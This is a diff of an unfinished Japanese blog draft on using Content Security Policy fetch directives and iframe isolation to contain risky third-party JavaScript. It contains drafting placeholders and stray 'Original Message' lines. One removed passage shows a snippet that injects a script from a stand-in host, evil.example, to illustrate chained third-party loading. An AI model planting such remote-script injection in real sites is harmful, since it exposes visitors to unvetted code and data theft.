@@ -2,35 +2,80 @@
 
 こんにちは、プラットフォームエンジニア & 安全確保支援士の中山です。
 
-Web サイトにはしばしば 3rd-party JavaScript … 例えば Google Analytics のような Web 解析ツール、いいねボタンのような SNS 連携機能、広告掲載のための広告タグなど … を導入することがあります。一方で 3rd-party JavaScript には Web サイトを閲覧するユーザーに悪影響を与えてしまうリスクも存在するため、その導入とあわせた対策が必要となります。
+Web サイトにはしばしば 3rd-party JavaScript … 例えば Google Analytics のような Web 解析ツール、いいねボタンのような SNS 連携機能、広告掲載のための広告タグなど … を導入することがあります。
 
-そこで、今回の記事では Content Security Policy（以下 CSP）の Fetch ディレクティブを活用したリスク対策の取り組みについてお伝えしたいと思います。
+一方で 3rd-party JavaScript には Web サイトを閲覧するユーザーに悪影響を与えるリスクも存在するため、その導入とあわせてリスク対策も必要となります。
 
-## CSP の Fetch ディレクティブとは
+そこで、今回の記事では Content Security Policy（以降 CSP）の Fetch ディレクティブを活用したリスク対策の取り組みについてお伝えします。
 
-詳しくは [W3C 仕様](https://www.w3.org/TR/CSP3/) を確認頂くとして、概念を絵にしたものがこちらです。
+CSP の Fetch ディレクティブについての詳細は [W3C 仕様](https://www.w3.org/TR/CSP3/) を確認頂くとして、その概念 … Web ブラウザに対してサブリソースの読み込みやインライン JavaScript の実行に関する許可リストを指示 … を絵にしたものがこちらです。
 
-（★ここも絵を、Fetch もかく）
+（★１：Fetch ディレクティブの説明）
 
-Web ブラウザに対してサブリソースの読み込みやインライン JavaScript の実行の制限を指示することで
-
-- XSS リスクの軽減
-- 外部ドメインへの意図しないデータ転送の抑制
-- ある事業者の 3rd-party JavaScript から読み込まれる別な事業者の 3rd-party JavaScript の実行抑制
-
-などの効果が期待できます。
-
-例えば script-src の場合
+例えば ***script-src*** …
 
 > The script-src directive restricts the locations from which scripts may be executed. This includes not only URLs loaded directly into script elements, but also things like inline script blocks and XSLT stylesheets [XSLT] which can trigger script execution. 
 
-Web サイトが
+を使って Web サイトが
 
 ```
-Content-Security-Policy: script-src 'self'
+Content-Security-Policy: script-src http://allowed.example/
 ```
 
-のような応答ヘッダを送信すると同一オリジンから読み込まれた JavaScript の実行のみ許可されます。
+のような指示を応答ヘッダとして送信した場合、Web ブラウザは ***allowed.example*** から読み込んだ JavaScript のみ実行を許可します。
+
+では、もう少し 3rd-party JavaScript のリスクと対策について掘り下げてみましょう。
+
+Web ブラウザの開発者ツールを使うことで Web サイトに導入されている 3rd-party JavaScript を確認することができます。
+
+（★２：開発者ツール）
+
+このとき、もし 3rd-party JavaScript を提供する事業者に悪意があったり、仮に悪意はなくとも別な攻撃者によってホスト先の CDN やリポジトリ上の JavaScript コードが改変されていた場合、Web サイト内の情報 … ユーザーのアカウントに紐づく個人情報が含まれるかもしれません … が盗まれたり、閲覧中のユーザーが [フィッシングサイトに誘導](https://blog.techscore.com/entry/2022/08/24/150000) される、といったリスクが生じます。
+
+（★３）
+
+上記リスクへの対策に Web ブラウザの Same Origin Policy（以下 SOP）という仕様を利用する方法があります。
+
+1. ドメイン ***safe.exampl***e から text/html 文書「Ａ」を読み込む
+2. 文書「Ａ」内の iframe 要素経由でドメイン ***unsafe.example*** の text/html 文書「Ｂ」を読み込む
+3. 文書「Ｂ」内で 3rd-party JavaScript を読み込んで実行する
+
+文書「Ｂ」で実行される JavaScript は文書「Ａ」の DOM にアクセスできないため、万が一 3rd-party JavaScript を提供する事業者に悪意があったとしてもその影響範囲を iframe 内に限定することができます。
+
+（★４）
+
+他方、Web 解析ツールや広告のビューアビリティー計測など 3rd-party JavaScript がその目的を達成するために文書「Ａ」の DOM にアクセスする必要がある場合、SOP を利用した対策は採用できません。
+
+なので、信頼できる 3rd-party JavaScript については一定のリスクは受容せざるを得ないでしょう。
+
+（★５）
+
+現実はもう少し複雑で、
+
+- 3rd-party JavaScript の信頼性の判断は容易ではない
+- タグマネージャーを使ってアナリストやマーケティング担当が 3rd-party JavaScript を導入する場合がある
+- ある事業者の 3rd-party JavaScript から別な … しばしば複数の … 事業者の 3rd-party JavaScript が読み込まれる場合がある
+
+などの前提を置いて Web サイトを運営する必要があります。
+
+2019 年の情報ですが、総務省の [オンライン広告におけるトラッキングの現状とその法的考察](https://www.soumu.go.jp/main_content/000599872.pdf) によれば
+
+> タレントのコマーシャル起用で知られる大手スポーツジム運営会社の場合、2018 年 5 月の調査時点でサイト閲覧すると閲覧者のブラウザは 86 の広告会社や解析会社などにアクセスし、情報を送信することとなっていたが、執筆者がこのジム運営会社にたずねたところ、把握していたのは代理店 1 社に依頼した 6 事業者の 11 の JavaScript のみであり、残る 75 の情報送信先については気づいていなかった。
+
+だそうです。怖いですね ^^;
+
+（★６）
+
+ここで 3rd-party JavaScript のリスク対策として CSP の Fetch ディレクティブの出番となります。
+
+
+
+
+
+
+
+
+-----Original Message-----
 
 ちなみに CSP の Fetch ディレクティブは meta 要素にも定義可能ですが
 
@@ -40,72 +85,10 @@ Content-Security-Policy: script-src 'self'
 
 > I really wish we'd stop with meta-element based policies.
 
-のような意見も出ているので参考にしてください。
+のような意見も出ているのでご注意を。
 
-## 3rd-party JavaScript の課題と対策
+-----Original Message-----
 
-Web ブラウザの開発者ツールを使うことで Web サイトに導入されている 3rd-party JavaScript を確認することができます。
-
-<img src='https://raw.githubusercontent.com/nakayama-kazuki/202x/main/CSP/pict01.png' />
-
-このとき、もし 3rd-party JavaScript を提供する事業者に悪意があったり、悪意はなくとも別な攻撃者によって CDN やリポジトリ上の JavaScript コードが改変されていた場合、Web サイトに掲載された情報 … 閲覧しているユーザーのログインアカウントに紐づく個人情報が含まれるかもしれません … が盗まれたり、ユーザーが [フィッシングサイトに誘導](https://blog.techscore.com/entry/2022/08/24/150000) されてしまう、などのリスクが発生します。
-
-<img src='https://raw.githubusercontent.com/nakayama-kazuki/202x/main/CSP/sec01.png' />
-
-こうしたリスクへの対策として Web ブラウザの Same Origin Policy（以下 SOP）という仕様を利用する方法があります。具体的には iframe 要素によってドメインを分離した環境 3rd-party JavaScript を実行することで、万が一悪意のある処理が実行されたとしてもその影響範囲を iframe 内に限定することができます。
-
-<img src='https://raw.githubusercontent.com/nakayama-kazuki/202x/main/CSP/sec02.png' />
-
-ただし、Web 解析ツールや広告のビューアビリティー計測など 3rd-party JavaScript がその目的を達成するために Web サイトの DOM にアクセスする必要がある場合、SOP を利用した対策は採用できません。とはいえ、信頼できる安全な 3rd-party JavaScript ならば問題はないでしょう。
-
-★★
-
-<img src='https://raw.githubusercontent.com/nakayama-kazuki/202x/main/CSP/sec03.png' />
-
-ところが、ある事業者の 3rd-party JavaScript から別な事業者の 3rd-party JavaScript が読み込まれるケースも存在します。
-
-<img src='https://raw.githubusercontent.com/nakayama-kazuki/202x/main/CSP/sec04.png' />
-
-例えば Web サイトが以下のマークアップを含み
-
-```
-<script src='https://hoge.example/hoge.js'></script>
-```
-
-さらに hoge.js が以下のようなコードを含む場合に evil.js が読み込まれます。
-
-```
-let script = document.createElement('SCRIPT');
-script.src = 'https://evil.example/evil.js';
-let targetNode = document.getElementsByTagName('SCRIPT').item(0);
-targetNode.parentNode.appendChild(script);
-```
-
-こうした 3rd-party JavaScript 読み込みが複数回実行されることもあり、そうなるともはや安全性の確認は困難です。行儀の悪い事業者の 3rd-party JavaScript がコンテンツ情報を勝手に収集している … なんてこともあるかもしれません。
-
-<img src='https://raw.githubusercontent.com/nakayama-kazuki/202x/main/CSP/sec05.png' />
-
-このような場合に CSP の Fetch ディレクティブを使うことで、ホワイトリストで許可していないサブリソースの読み込みを制限することができます。
-
-<img src='https://raw.githubusercontent.com/nakayama-kazuki/202x/main/CSP/sec06.png' />
-
-## CSP による対策と次の課題
-
-Same Origin Policy と
-
-一方でメディアサービスなどの Web サイトの場合は多くの 3rd-party JavaScript を導入しています。導入を把握している 3rd-party JavaScript の範囲ならば管理することは可能かもしれませんが、
-
-
-例えば総務省の
-
-その全ての安全性を確認することは現実的ではないかもしれません。
-
-
-★例の知らない間に 90 個のタグとか（どこかの引用）
-
-★それを CSP の Fetch ディレクティブで対策
-★絵で示す
-★ところが 3rd-party ツールの場合のホワイトリスト管理の難しさ
 
 ## 現実解の模索
 
